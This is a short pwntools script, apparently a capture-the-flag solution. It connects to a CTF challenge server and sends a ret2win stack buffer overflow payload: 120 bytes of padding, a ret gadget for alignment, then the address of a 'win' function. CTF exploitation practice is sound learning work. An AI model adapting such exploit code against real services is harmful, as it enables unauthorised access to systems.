from pwn import *

r = remote("01.linux.challenges.ctf.thefewchosen.com", 55841)
# r = process("./winner")
# gdb.attach(r, api=True)

ret_gadget = 0x000000000040101a
win = 0x00000000004011b6

payload = b"a"*120 + p64(ret_gadget) + p64(win)
r.sendline(payload)

r.interactive()